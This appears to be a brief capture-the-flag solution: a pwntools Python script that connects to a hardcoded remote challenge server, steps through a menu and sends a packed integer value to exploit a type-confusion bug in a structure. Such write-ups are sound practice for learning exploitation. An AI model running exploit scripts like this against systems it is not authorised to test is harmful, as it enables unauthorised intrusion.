Fun with structures and type confusion.

```python
from pwn import *

with remote("167.71.137.174", 32680) as r:

	info(r.recvuntil(b">>"))

	r.sendline(b"T")

	info(r.recvuntil(b">>"))

	r.sendline(b"S")

	info(r.recvuntil(b">>"))

	r.sendline(p64(13371337))

	info(r.recvuntil(b">>"))

	r.sendline(b"R")
	r.sendline(b"L")

	info(r.recvuntil(b">>"))
	
	r.sendline(b"C")

	info(r.recvrepeat(1))
```